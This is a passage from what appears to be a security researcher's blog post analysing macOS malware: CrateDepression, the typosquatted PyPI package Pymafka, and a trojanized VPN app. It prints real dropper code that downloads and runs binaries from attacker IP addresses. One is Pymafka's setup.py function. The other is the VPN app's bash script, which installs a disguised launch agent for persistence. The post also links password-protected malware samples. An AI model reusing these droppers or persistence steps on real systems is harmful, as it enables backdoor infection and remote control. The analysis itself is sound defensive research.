</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                file <span style="color:#f92672">=</span> File::create(Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">77</span>,<span style="color:#ae81ff">126</span>,<span style="color:#ae81ff">157</span>,<span style="color:#ae81ff">84</span>,<span style="color:#ae81ff">89</span>,<span style="color:#ae81ff">90</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">136</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">66</span>]))<span style="color:#f92672">?</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>            file.write_all(dst.as_slice())<span style="color:#f92672">?</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>        <span style="color:#f92672">..</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    }</span></span></code></pre></div>
<p>Using our Python decryptor we can recover the plaintext values from both this function, but also everywhere else in the malware:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% python3 decode.py
linux
https://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/READMEv2.bin

macos
https://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/README.bin

/tmp/git-updater.bin

xattr
com.apple.quarantine
-r
-d
chmod
+x
</pre>
</div>
<p>From this output (and as confirmed via continued code analysis), we can see that malware checking the OS it&rsquo;s on (linux or macos) and, depending on the OS, will download a 2<sup>nd</sup>-stage payload.</p>
<p>For macOS, the payload will be retrieved from the 2nd URL: <code>https://api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99/README.bin</code>.</p>
<p>It is then saved to <code>/tmp/git-updater.bin</code>. After the quarantine attribute (<code>com.apple.quarantine</code>) is removed (via <code>xattr</code>), it is set to executable via: <code>c hmod +x</code>. The 2<sup>nd</sup>-stage payload is then executed.
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch/Logic Item</span>
</p>
<p>The SentinelOne researchers who <a href="https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/">analyzed</a> the 2<sup>nd</sup>-stage payload noted it was simply a &ldquo;unsigned Poseidon payload&rdquo;</p>
<p>According to its <a href="https://github.com/MythicAgents/poseidon">Github repository</a>, Poseidon is,</p>
<blockquote>
"...is a Golang agent [for Mythic] that compiles into Linux and macOS x64 executables."
</blockquote>
<div class="note">
Mythic is "a cross-platform, post-exploit, red teaming framework ...designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming." -Mythic Github repository
</div>
<p>In terms of persistence, <code>Poseidon</code> can be persisted as either a launch item (agent or daemon) or as a login item:</p>
<p><img src="../images/blog/blog_0x71/crPersist.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Poseidon&#39;s persistence modules</center>

<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Fully-featured Backdoor 
</span>
</p>
<p><code>Poseidon</code> (the payload downloaded and executed by the malicious Rust crate), supports a myriad of a capabilities. As its open-source, it&rsquo;s easy to see exactly what it is capable of. Specifically, perusing it&rsquo;s <a href="https://github.com/MythicAgents/poseidon">Github repository</a> this includes:</p>
<ul>
<li>download</li>
<li>execute</li>
<li>keylog</li>
<li>portscan</li>
<li>screencapture</li>
<li>socks (proxy)</li>
</ul>
<p>It also supports basic commands such as <code>cat</code>, <code>cd</code>, <code>kill</code>, <code>ls</code>, <code>rm</code>, etc. etc.
<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>CrateDepression</code> include the following (credit: SentinelOne):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/tmp/git-updater.bin</code>:</li>
</ul>
</li>
<li>
<p>Network:</p>
<ul>
<li><code>api.githubio.codes/v2/id/f6d50b696cc427893a53f94b1c3adc99</code></li>
</ul>
</li>
</ul>
<br>
<h3 id="-pymafka">üëæ <strong><code>Pymafka</code></strong></h3>
<div class="note">
<p>Spread though &ldquo;typosquatting&rdquo; of a popular Python package (<code>PyKafka</code>), this python-based malware installs a compiled Cobalt Strike agent.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/Pymafka.zip"><code>Pymafka</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In May, <a href="https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux">Sonatype</a>&rsquo;s automated malware detection bots found what turned out to be a malicious Python package in the PyPI registry.</p>
<blockquote>
"On May 17th, a mysterious 'pymafka' package appeared on the PyPI registry. The package was shortly flagged by the Sonatype Nexus platform's automated malware detection capabilities." -Sonatype
</blockquote>
<br>
<img src="../images/blog/blog_0x71/pmPackage.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">pymafka package (image credit: Sonatype)</center>

<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux">&ldquo;New &lsquo;pymafka&rsquo; Malicious Package Drops Cobalt Strike on macOS, Windows, Linux&rdquo;</a></li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector</b>: TypoSquatting</span></p>
<p>As <a href="https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux">noted by the Sonatype researchers</a>, the malicious Python package was named <code>pymafka</code> specifically so users might inadvertently download it (and infect themselves) while looking for the legitimate &ldquo;<code>Pykafka</code>&rdquo; Python package:</p>
<blockquote>
"The package appears to typosquat a legitimate popular library PyKafka, a programmer-friendly Apache Kafka client for Python." -Sonatype
</blockquote>
<br>
<div class="note">
The legitimate Python package, PyKafka, is "a programmer-friendly Kafka client for Python" -pykafka package page
<p>Sonatype points out the legitimate Python package, has been downloaded over 4 million times. Due to its popularity, it&rsquo;s understandable that it became a typesquatting target.</p>
</div>
<p>The malicious infection logic in the &ldquo;<code>pymafka</code>&rdquo; package was found in a <code>setup.py</code> file.</p>
<blockquote>
"The 'setup.py' Python script inside 'pymafka' first detects your platform. Depending on whether you are running Windows, macOS, or Linux, an appropriate malicious trojan is downloaded and executed on the infected system." -Sonatype
</blockquote>
<p>Let&rsquo;s look at the macOS-specific logic that completes the infection. It&rsquo;s found in a function named <code>inst</code> (in the <code>setup.py</code> file):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inst</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> platform<span style="color:#f92672">.</span>system()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;Darwin&#34;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>       sfile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/tmp/zad&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>       <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(sfile):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>          url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://141.164.58.147:8090/MacOs&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>          f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>urlopen(url)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>          data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>          <span style="color:#66d9ef">with</span> open(sfile, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> code:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            code<span style="color:#f92672">.</span>write(data)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>          
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>          subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;chmod&#34;</span>,<span style="color:#e6db74">&#34;+x&#34;</span>,sfile])
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>          subprocess<span style="color:#f92672">.</span>Popen(<span style="color:#e6db74">&#34;nohup /var/tmp/zad &gt; /tmp/log 2&gt;&amp;1 &amp;&#34;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    </span></span></code></pre></div>
<p>As the malicious Python code is relatively straightforward, it&rsquo;s easy to understand that the code:</p>
<ul>
<li>Requests a binary named <code>MacOs</code> from <code>http://141.164.58.147:8090</code></li>
<li>Saves it to <code>/var/tmp/zad</code></li>
<li>Makes it executable (via <code>chmod</code>), then executes it
<br></li>
</ul>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Unknown (none?)</span>
</p>
<p>Once execute, we saw that the malicious Python will simply download and execute a binary (<code>/var/tmp/zad</code>). In their report, Sonatype pointed out that this is Cobalt Strike beacon:</p>
<blockquote>
"The [downloaded and executed] trojan  ...is a Cobalt Strike (CS) beacon." -Sonatype
</blockquote>
<p>Though Cobalt Strike can be (manually?) persisted, this instance when executed was not observed persisting. Its worth noted it perhaps could be instructed to persist once it checks in with the Cobalt Strike Server.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Fully-featured Agent
</span>
</p>
<p>As noted, <code>pymafka</code> downloads and executes a Cobalt Strike (CS) beacon/payload.</p>
<div class="note">
Q: What is Cobalt Strike?
<p>A: &ldquo;Cobalt Strike is a pen-testing software tool typically used by red teams and ethical hackers for simulating real-world cyberattacks&hellip;</p>
<p>But, time and time again attackers [as in this attack], including ransomware groups like LockBit, have abused Cobalt Strike to infect victims.&rdquo; -Sonatype</p>
</div>
<p>Cobalt Strike supports a myriad of features, that allow a remote attack, full control over an infected system. The following image, from the commercial makers of Cobalt Strike, provides an overview of its capabilities:</p>
<img src="../images/blog/blog_0x71/pmPayload.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Cobalt Strike&#39;s Capabilities (image credit: Fortra)</center>

<br>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>Pymafka</code> include the following (credit: Sonatype):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/var/tmp/zad</code>: <br>
<code>b117f042fe9bac7c7d39eab98891c2465ef45612f5355beea8d3c4ebd0665b45</code></li>
</ul>
</li>
<li>
<p>Network</p>
<ul>
<li><code>46.137.201.254</code>
<br>
<br></li>
</ul>
</li>
</ul>
<h3 id="-vpn-trojan-covid">üëæ <strong><code>&quot;VPN Trojan&quot;</code> (<code>Covid</code>)</strong></h3>
<div class="note">
<p>This malware, is persistent backdoor that downloads and executes 2<sup>nd</sup>-stage payloads directly from memory.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/Covid.zip"><code>"VPN Trojan" (Covid)</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In July, researchers at SentinelOne <a href="https://www.sentinelone.com/blog/from-the-front-lines-new-macos-covid-malware-masquerades-as-apple-wears-face-of-apt/">published a report</a> on an interesting malware sample, with connections and overlaps to the APT-attributed malware DazzleSpy:</p>
<img src="../images/blog/blog_0x71/vpnS1.jpeg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A new macOS malware specimen (image credit: SentinelOne)</center>

<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://www.sentinelone.com/blog/from-the-front-lines-new-macos-covid-malware-masquerades-as-apple-wears-face-of-apt/">&ldquo;From the Front Lines | New macOS &lsquo;covid&rsquo; Malware Masquerades as Apple, Wears Face of APT&rdquo;</a></li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Trojanized Disk Images(?)</span></p>
<p>The researchers (<a href="https://twitter.com/philofishal">Phil</a> and <a href="https://twitter.com/dineshdina04">Dinesh</a>) who analyzed the malware, wrote that it was found within a disk image (<code>vpn.dmg</code>) that had been uploaded to VirusTotal:</p>
<blockquote>
"We recently came across a new malware sample...[in] a DMG named ‚Äòvpn‚Äô [that] was uploaded to VirusTotal." -SentinelOne
</blockquote>
<p>At the time (it was uploaded to VirusTotal), is was undetected:</p>
<img src="../images/blog/blog_0x71/vpnVT.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Undetected on VirusTotal</center>

<p>Its not clear how the trojanized disk image would be delivered to targeted users. Perhaps, (as this malware has some notable overlaps to other Mac malware (ab)used by Chinese APT groups) users believed it contained a VPN software that could be used to circumvent Chinese government surveillance?</p>
<p>Regardless, if the user downloads the disk image and runs what they believe is a legitimate VPN application they will be infected:</p>
<p><img src="../images/blog/blog_0x71/vpnApp.png"  width="" class="center" style="border-radius: 4px;">

<br>
<img src="../images/blog/blog_0x71/vpnUI.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Trojanized VPN Application</center>

<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Agent</span>
</p>
<p>When the trojanized VPN application is run from the disk image, it will execute a script named found within its application bundle (<code>Contents/Resources/script</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>path<span style="color:#f92672">=</span>$HOME
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>platform<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>mkdir $path/.androids
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $platform <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x86_64&#39;</span> <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        curl -L http://46.137.201.254/softwareupdated2 -o $path/.androids/softwareupdated
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        curl -L http://46.137.201.254/softwareupdated -o $path/.androids/softwareupdated
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>chmod a+x $path/.androids/softwareupdated
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>echo <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34;encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#e6db74">&lt;!DOCTYPE plist PUBLIC&#34;-//Apple//DTD PLIST 1.0//EN&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#e6db74">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#e6db74">&lt;plist version=&#34;1.0&#34;&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#e6db74">    &lt;dict&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#e6db74">        &lt;key&gt;KeepAlive&lt;/key&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#e6db74">        &lt;true/&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#e6db74">        &lt;key&gt;RunAtLoad&lt;/key&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#e6db74">        &lt;true/&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#e6db74">        &lt;key&gt;Label&lt;/key&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#e6db74">        &lt;string&gt;softwareupdated&lt;/string&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#e6db74">        &lt;key&gt;ProgramArguments&lt;/key&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span><span style="color:#e6db74">        &lt;array&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span><span style="color:#e6db74">            &lt;string&gt;&#39;</span>$path/.androids/softwareupdated<span style="color:#e6db74">&#39;&lt;/string&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span><span style="color:#e6db74">            &lt;string&gt;-D&lt;/string&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#e6db74">        &lt;/array&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span><span style="color:#e6db74">        &lt;key&gt;WorkingDirectory&lt;/key&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span><span style="color:#e6db74">        &lt;string&gt;&#39;</span>$path/.androids/<span style="color:#e6db74">&#39;&lt;/string&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span><span style="color:#e6db74">    &lt;/dict&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span><span style="color:#e6db74">&lt;/plist&gt;&#39;</span> &gt; ~/Library/LaunchAgents/com.apple.softwareupdate.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>chmod <span style="color:#ae81ff">644</span> ~/Library/LaunchAgents/com.apple.softwareupdate.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>launchctl start softwareupdated
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>$path/.androids/softwareupdated &amp;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>chflags uchg $path/.androids/softwareupdated
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>curl -L http://46.137.201.254/covid -o $path/covid
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>chmod a+x $path/covid
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>/$path/covid</span></span></code></pre></div>
<p>This first creates a hidden directory: <code>~/.androids</code>:</p>
<p>We can passively observe this via a <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    <b>"destination" : "/Users/user/.androids",</b>
    "process" : {
      ...
      "path" : "/bin/mkdir",
      "name" : "mkdir",
      "pid" : 9404
    }
  }
}
</pre>
</div>
<p>After downloading a binary (from <code>46.137.201.254</code>), to a <code>~/.androids/softwareupdated</code> the script will persist the binary as a launch agent.</p>
<p>Specifically it saves (via <code>&gt;</code>) an embedded launch item plist to: <code>~/Library/LaunchAgents/com.apple.softwareupdate.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    <b>"destination" : "/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist"</b>,
    "process" : {
      "arguments" : [
        "/bin/bash",
        "/Volumes/vpn.app/Contents/Resources/script"
      ],
    
      "path" : "/bin/bash",
      "name" : "bash",
      "pid" : 9499
    }
  }
}
</pre>
</div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> the specified binary (<code>~/.androids/softwareupdated</code>) will be persistently executed by macOS, each time the user logs in.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Implant and (in-memory) Module Loader
</span>
</p>
<p>The script executed by the malicious VPN application downloads and installs two additional binaries:</p>
<ul>
<li><code>~/covid</code></li>
<li><code>~/.androids/softwareupdated</code></li>
</ul>
<p>As just noted, the latter is persisted as a launch agent (<code>com.apple.softwareupdate.plist</code>).</p>
<p>The SentinelOne researchers noted that this persistent binary, <code>softwareupdated</code> is a Sliver implant:</p>
<blockquote>
  "<i>Sliver implants offer the operator multiple functions useful to adversaries, including opening a shell on the target machine. The softwareupdated binary periodically checks in with the C2 to retrieve scheduled tasks, execute them, and return the results. Sliver implants also have the ability to allow the operator to open an interactive real time session for direct tasking and exploitation.</i>" -SentinelOne 
</blockquote>
<p>This is easy to confirm via embedded strings:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings -a softwareupdated
...

sliverpb/sliver.proto
.sliverpb.EnvelopeR
.sliverpb.RegisterR
.sliverpb.RegisterR
.sliverpb.NetInterfaceR
.sliverpb.FileInfoR
.sliverpb.SockTabEntry.SockAddrR
.sliverpb.SockTabEntry.SockAddrR
.sliverpb.SockTabEntryR
.sliverpb.DNSBlockHeaderR
.sliverpb.ServiceInfoReqR
.sliverpb.ServiceInfoReqR
.sliverpb.PivotTypeR
.sliverpb.PivotTypeR
.sliverpb.NetConnPivotR
.sliverpb.PivotPeerR
.sliverpb.PeerFailureTypeR
.sliverpb.PivotListenerR
.sliverpb.WGTCPForwarderR
.sliverpb.WGSocksServerR
.sliverpb.WGSocksServerR
.sliverpb.WGTCPForwarderR
.sliverpb.WindowsPrivilegeEntryR
B/Z-github.com/bishopfox/sliver/protobuf/sliverpbb
</pre>
</div>
<br></p>
<div class="note">
What is Sliver? 
